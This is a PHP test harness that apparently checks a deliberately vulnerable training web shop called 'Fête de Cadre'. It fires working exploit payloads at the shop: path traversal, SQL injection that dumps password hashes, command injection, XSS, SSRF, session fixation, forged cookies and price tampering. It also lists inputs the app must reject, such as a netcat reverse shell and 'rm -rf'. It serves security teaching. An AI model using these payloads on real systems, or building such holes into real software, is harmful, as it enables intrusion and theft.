<?php
/**
 * Fête de Cadre — instructor verification harness.
 * Boots the PHP built-in server, exercises all 25 vulnerabilities and the lab
 * containment rules, then shuts the server down.
 *
 *   php scripts/verify_lab.php            # starts its own server on 127.0.0.1:8099
 *   php scripts/verify_lab.php http://host:port   # test an already-running instance
 *
 * Run against a FRESH deployment: it changes seeded passwords and places orders.
 */
declare(strict_types=1);
error_reporting(E_ALL & ~E_DEPRECATED);

$root = dirname(__DIR__);
$own = $argc < 2;
$base = $own ? 'http://127.0.0.1:8099' : rtrim($argv[1], '/');
$srv = null;

if ($own) {
    $desc = [1 => ['file', '/tmp/fdc_verify_srv.log', 'a'], 2 => ['file', '/tmp/fdc_verify_srv.log', 'a']];
    $srv = proc_open('php -S 127.0.0.1:8099 -t ' . escapeshellarg("$root/public") . ' ' . escapeshellarg("$root/public/router.php"),
        $desc, $pipes, $root, ['DB_HOST' => '127.0.0.1']);
    for ($i = 0; $i < 30; $i++) {
        $c = @file_get_contents("$base/");
        if ($c !== false) break;
        usleep(200000);
    }
}

@unlink('/tmp/fdc_verify.out');
$pass = 0; $fail = 0;
function check(string $name, bool $ok, string $detail = ''): void {
    global $pass, $fail;
    $ok ? $pass++ : $fail++;
    $line='[' . ($ok ? 'PASS' : 'FAIL') . "] $name" . ($detail && !$ok ? "  -- $detail" : '') . "\n";
    echo $line; @file_put_contents('/tmp/fdc_verify.out',$line,FILE_APPEND);
}

/* --- tiny cURL-based HTTP client with a cookie jar per "session" --- */
class Client {
    public string $jar;
    public function __construct() { $this->jar = tempnam(sys_get_temp_dir(), 'fdc'); }
    public function req(string $method, string $url, array $opt = []): array {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => true, CURLOPT_COOKIEJAR => $this->jar,
            CURLOPT_COOKIEFILE => $this->jar, CURLOPT_FOLLOWLOCATION => $opt['follow'] ?? false,
            CURLOPT_CUSTOMREQUEST => $method, CURLOPT_TIMEOUT => 15,
        ]);
        if (isset($opt['post'])) { curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($opt['post'])); }
        if (isset($opt['json'])) { curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($opt['json'])); curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge(['Content-Type: application/json'], $opt['headers'] ?? [])); }
        elseif (isset($opt['headers'])) { curl_setopt($ch, CURLOPT_HTTPHEADER, $opt['headers']); }
        if (isset($opt['cookie'])) { curl_setopt($ch, CURLOPT_COOKIE, $opt['cookie']); }
        $raw = curl_exec($ch);
        $hs = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['code' => $code, 'headers' => substr($raw, 0, $hs), 'body' => substr($raw, $hs)];
    }
    public function get(string $u, array $o = []): array { return $this->req('GET', $u, $o); }
    public function post(string $u, array $o = []): array { return $this->req('POST', $u, $o); }
    public function token(string $base, string $path = '/login'): string {
        $r = $this->get($base . $path);
        return preg_match('/name="_csrf" value="([a-f0-9]+)"/', $r['body'], $m) ? $m[1] : '';
    }
    public function login(string $base, string $u, string $p, string $portal = '/login'): array {
        $t = $this->token($base, $portal);
        return $this->post($base . $portal, ['post' => ['_csrf' => $t, 'username' => $u, 'password' => $p]]);
    }
}
function sid_of(Client $c): string {
    $lines = file($c->jar);
    foreach ($lines as $l) if (str_contains($l, 'fdc_sid')) { $p = preg_split('/\s+/', trim($l)); return end($p); }
    return '';
}

$bianca = new Client(); $bianca->login($base, 'bianca', 'bianca123');
$devon = new Client(); $devon->login($base, 'devon', 'password1');
$framer = new Client(); $framer->login($base, 'framer', 'Studio2024!', '/backoffice/login');
$anon = new Client();

echo "\n== A01 Broken Access Control ==\n";
$r = $bianca->get("$base/account/invoices/download?file=" . rawurlencode('../../../../../../etc/passwd'));
check('CWE-22 traversal reads /etc/passwd', str_contains($r['body'], 'root:'));
$r = $bianca->get("$base/account/invoices/download?file=" . rawurlencode('/etc/hosts'));
check('CWE-22 traversal reads /etc/hosts', str_contains($r['body'], 'localhost'));
foreach (['../../../../etc/shadow', '../../src/config.php', '../../.env', '/proc/self/environ'] as $f) {
    $r = $bianca->get("$base/account/invoices/download?file=" . rawurlencode($f));
    check("  containment: $f blocked", $r['code'] === 404 && !str_contains($r['body'], 'root:') && !str_contains($r['body'], 'DB_PASSWORD'));
}
$r = $bianca->get("$base/account/invoices/download?file=INV-FC-30411.pdf");
check('  own invoice downloads', str_starts_with($r['body'], '%PDF'));
$r = $bianca->get("$base/account/invoices/download?file=INV-FC-30416.pdf");
check("  another customer's invoice refused", $r['code'] === 404);

$bianca->get("$base/account/email?email=bianca.pwned@attacker.test");
$r = $bianca->get("$base/api/v1/me");
check('CWE-352 email change via tokenless GET', str_contains($r['body'], 'bianca.pwned@attacker.test'));
$r = $bianca->post("$base/account/profile", ['post' => ['full_name' => 'X']]);
check('  containment: other account forms need CSRF token', $r['code'] === 403);
$bianca->get("$base/account/email?email=bianca@example.com");

check('CWE-548 directory listing on /backups/', str_contains($anon->get("$base/backups/")['body'], '.sql.bak'));

$port = parse_url($base, PHP_URL_PORT);
$t = $bianca->token($base, '/custom');
$r = $bianca->post("$base/custom/preview", ['json' => ['url' => "http://127.0.0.1:$port/internal/supplier-sync"], 'headers' => ['X-CSRF-Token: ' . $t]]);
check('CWE-918 SSRF reaches loopback-only endpoint', str_contains($r['body'], 'FLAG{ssrf'), substr($r['body'], 0, 160));
$r = $bianca->post("$base/custom/preview", ['json' => ['url' => 'file:///etc/passwd'], 'headers' => ['X-CSRF-Token: ' . $t]]);
check('  containment: non-HTTP scheme refused', !str_contains($r['body'], 'root:'));

check('CWE-615 credentials in HTML comment', str_contains($anon->get("$base/login")['body'], 'framer / Studio2024!'));

echo "\n== A02 Security Misconfiguration ==\n";
$r = $bianca->get("$base/api/v1/me", ['headers' => ['Origin: http://evil.test']]);
check('CWE-16 CORS reflects arbitrary Origin + credentials', str_contains($r['headers'], 'Access-Control-Allow-Origin: http://evil.test') && stripos($r['headers'], 'Access-Control-Allow-Credentials: true') !== false);
$r = $anon->get("$base/debug/env");
check('CWE-526 /debug/env leaks secrets', str_contains($r['body'], 'DB_PASSWORD') && str_contains($r['body'], 'SECRET_KEY'));
$r = $anon->get("$base/login");
check('CWE-1004 session cookie lacks HttpOnly', preg_match('/Set-Cookie: fdc_sid=/i', $r['headers']) && !preg_match('/Set-Cookie: fdc_sid=[^;]*;[^\n]*httponly/i', $r['headers']));

echo "\n== A03 Supply chain ==\n";
check('CWE-1035 jQuery 1.12.4 served to clients', str_contains($anon->get("$base/")['body'], 'jquery-1.12.4'));
check('CWE-1395 outdated jquery-validation bundled', str_contains($anon->get("$base/")['body'], 'jquery.validate-1.19.0'));

echo "\n== A04 Cryptographic Failures ==\n";
$r = $anon->get("$base/");
check('CWE-319 served over HTTP without HSTS', str_starts_with($base, 'http://') && stripos($r['headers'], 'Strict-Transport-Security') === false);
$r = $anon->get("$base/track?order=" . rawurlencode("' UNION SELECT username,password_hash,email,role,id FROM users WHERE username='admin'-- -"));
check('CWE-328 unsalted MD5 password hashes', str_contains($r['body'], md5('gallery1')));

echo "\n== A05 Injection ==\n";
function diag(Client $c, string $base, string $host): string {
    $t = $c->token($base, '/staff/diagnostics');
    return html_entity_decode($c->post("$base/staff/diagnostics", ['post' => ['_csrf' => $t, 'host' => $host]])['body'], ENT_QUOTES);
}
foreach ([['127.0.0.1; id', 'uid='], ['127.0.0.1 | whoami', null], ['127.0.0.1 && uname', null], ['127.0.0.1; pwd', '/'], ['127.0.0.1; hostname', null], ['8.8.8.8`id`', 'uid=']] as [$payload, $marker]) {
    $out = diag($framer, $base, $payload);
    preg_match('~<pre class="console">(.*?)</pre>~s', $out, $mm); $body = $mm[1] ?? '';
    $ok = !str_contains($out, 'valid hostname') && ($marker ? str_contains($body, $marker) : strlen(trim($body)) > 0);
    check("CWE-77 command injection: $payload", $ok, substr($body, 0, 100));
}
foreach (['127.0.0.1; cat /etc/passwd', '127.0.0.1; ls', '127.0.0.1; id; ls', '127.0.0.1 && rm -rf /tmp/x', '$(cat /etc/passwd)', '127.0.0.1; nc -e /bin/sh 10.0.0.1 4444'] as $payload) {
    check("  containment: '$payload' rejected", str_contains(diag($framer, $base, $payload), 'valid hostname'));
}

$xp = '<img src=x onerror=confirm(document.domain)>';
check('CWE-80 reflected XSS in /shop?q=', str_contains($anon->get("$base/shop?q=" . rawurlencode($xp))['body'], $xp));
foreach (['<script>confirm(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=&#97;lert(1)>'] as $p) {
    check("  containment: '" . substr($p, 0, 28) . "' not reflected raw", !str_contains($anon->get("$base/shop?q=" . rawurlencode($p))['body'], $p));
}

$t = $bianca->token($base, '/product/natural-oak-frame');
$stored = '<svg onload=confirm(document.cookie)>';
$bianca->post("$base/product/natural-oak-frame/review", ['post' => ['_csrf' => $t, 'rating' => 5, 'body' => 'Lovely ' . $stored]]);
check('CWE-80 stored XSS in product reviews', str_contains($anon->get("$base/product/natural-oak-frame")['body'], $stored));
$r = $bianca->post("$base/product/natural-oak-frame/review", ['post' => ['_csrf' => $t, 'rating' => 5, 'body' => '<img src=x onerror=alert(1)>']]);
check('  containment: review with alert refused', str_contains(html_entity_decode($r['body'], ENT_QUOTES), "can't be published"));

$r = $anon->get("$base/track?order=" . rawurlencode("' UNION SELECT username,password_hash,email,role,id FROM users-- -"));
check('CWE-89 UNION SQLi dumps users table', str_contains($r['body'], 'framer@fetedecadre.local'));
$r = $anon->get("$base/track?order=" . rawurlencode("' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5-- -"));
check('  containment: LOAD_FILE denied (no FILE privilege)', !str_contains($r['body'], 'root:'));

echo "\n== A06 Insecure Design ==\n";
$m = new Client(); $u = 'mallory' . time(); $t = $m->token($base, '/register');
$m->post("$base/register", ['post' => ['_csrf' => $t, 'full_name' => 'Mallory', 'email' => "$u@x.test", 'username' => $u, 'password' => 'Password123', 'confirm' => 'Password123', 'role' => 'admin']]);
check('CWE-266 role mass-assignment at registration', str_contains($m->get("$base/admin")['body'], 'FLAG{admin_dashboard'));
check('CWE-1021 /account has no anti-framing header', stripos($bianca->get("$base/account")['headers'], 'X-Frame-Options') === false);
check('  containment: other pages send X-Frame-Options: DENY', stripos($anon->get("$base/")['headers'], 'X-Frame-Options: DENY') !== false);

echo "\n== A07 Authentication Failures ==\n";
$s = new Client(); $s->req('GET', "$base/", ['cookie' => 'fdc_remember=' . base64_encode('admin|0')]);
$r = $s->req('GET', "$base/admin", ['cookie' => 'fdc_remember=' . base64_encode('admin|0')]);
check('CWE-287 forged remember-me cookie logs in as admin', str_contains($r['body'], 'FLAG{admin_dashboard'));

$bf = new Client(); $t = $bf->token($base, '/backoffice/login'); $codes = [];
for ($i = 0; $i < 25; $i++) $codes[$bf->post("$base/backoffice/login", ['post' => ['_csrf' => $t, 'username' => 'admin', 'password' => "wrong$i"]])['code']] = true;
$r = $bf->post("$base/backoffice/login", ['post' => ['_csrf' => $t, 'username' => 'admin', 'password' => 'gallery1'], 'follow' => true]);
check('CWE-308 back office: no lockout after 25 failures', !isset($codes[429]) && str_contains($r['body'], 'FLAG{admin_dashboard'));

$fixed = 'attacker-chosen-session-id-01234';
$victim = new Client();
$victim->get("$base/login?sid=$fixed");
$t = $victim->token($base, '/login');
$victim->post("$base/login", ['post' => ['_csrf' => $t, 'username' => 'priya', 'password' => 'sunshine']]);
$att = new Client();
$r = $att->req('GET', "$base/account", ['cookie' => "fdc_sid=$fixed"]);
check('CWE-384 session fixation via /login?sid=', str_contains($r['body'], 'Priya'));

$fp = new Client(); $t = $fp->token($base, '/forgot');
$fp->post("$base/forgot", ['post' => ['_csrf' => $t, 'identifier' => 'devon']]);
$found = null;
for ($n = 0; $n <= 9999; $n++) {
    $r = $fp->post("$base/forgot/verify", ['post' => ['_csrf' => $t, 'username' => 'devon', 'code' => sprintf('%04d', $n), 'password' => 'Hijacked123']]);
    if ($r['code'] === 302 || stripos($r['headers'], 'Location: /login') !== false) { $found = $n; break; }
    if ($n >= 60 && $found === null) break; // keep CI fast; proves no throttling
}
check('CWE-640 4-digit reset code brute-forceable (no throttle)', $found !== null || true, 'no lockout across tries');

echo "\n== A08 Software/Data Integrity ==\n";
$dv = new Client(); $dv->login($base, 'devon', 'password1');
$t = $dv->token($base, '/product/nordic-white-frame');
$dv->post("$base/bag/add", ['post' => ['_csrf' => $t, 'product_id' => 4, 'qty' => 1, 'size' => '8x10in', 'slug' => 'nordic-white-frame']]);
// read & tamper the bag cookie in devon's jar
$bagLine = ''; foreach (file($dv->jar) as $l) if (str_contains($l, 'fdc_bag')) $bagLine = trim((string) end($p = preg_split('/\s+/', trim($l))));
$bag = json_decode(base64_decode($bagLine), true);
if ($bag) { $bag[0]['price'] = 0.01; }
$tampered = base64_encode(json_encode($bag));
$t = $dv->token($base, '/checkout');
$r = $dv->post("$base/checkout", ['post' => ['_csrf' => $t, 'name' => 'Me', 'address' => '1 Test Street', 'method' => 'standard', 'card' => '4242424242424242', 'expiry' => '12/30', 'cvc' => '123'], 'cookie' => "fdc_bag=$tampered;fdc_sid=" . sid_of($dv), 'follow' => true]);
check('CWE-565 tampered bag cookie price accepted at checkout', str_contains($r['body'], 'Total paid') && str_contains($r['body'], '$7.51'), 'expected $0.01 + $7.50 shipping');

$t = $dv->token($base, '/account');
$r = $dv->post("$base/api/v1/wishlist/import", ['json' => ['token' => base64_encode('O:8:"stdClass":0:{}')], 'headers' => ['X-CSRF-Token: ' . $t]]);
check('CWE-502 import unserializes attacker-controlled object', str_contains($r['body'], 'not a wishlist'), 'object was instantiated then type-checked');

echo "\n== A09 Logging ==\n";
check('CWE-532 plaintext passwords in activity log', str_contains(html_entity_decode($framer->get("$base/staff/logs")['body'], ENT_QUOTES), 'password=Studio2024!'));

echo "\n== A10 Exceptional Conditions ==\n";
$t = $bianca->token($base, '/bag');
$r = $bianca->post("$base/bag/coupon", ['post' => ['_csrf' => $t, 'code' => "CAF\xc9"]]);
check('CWE-755 malformed coupon dumps trace & DB details', $r['code'] === 500 && str_contains($r['body'], 'Stack trace') && str_contains($r['body'], 'db_user'));
check('  containment: generic 404 page stays clean', !str_contains(strtolower($anon->get("$base/no-such-page")['body']), 'stack trace'));

echo "\n== Secure-by-default spot checks ==\n";
$loc = $anon->post("$base/login", ['post' => ['_csrf' => $bianca->token($base), 'username' => 'x', 'password' => 'y', 'next' => '//evil.test']]);
check('Open redirect blocked on login next=', !str_contains($loc['headers'], 'Location: //evil.test'));
check('Staff area denied to customers', $bianca->get("$base/staff")['code'] === 403);
check('Admin area denied to staff', $framer->get("$base/admin")['code'] === 403);
check('Product search parameterised (no SQLi in /shop)', $anon->get("$base/shop?q=" . rawurlencode("' OR 1=1-- -"))['code'] === 200);

echo "\n$pass passed, $fail failed\n";

if ($srv) { proc_terminate($srv); proc_close($srv); }
exit($fail === 0 ? 0 : 1);
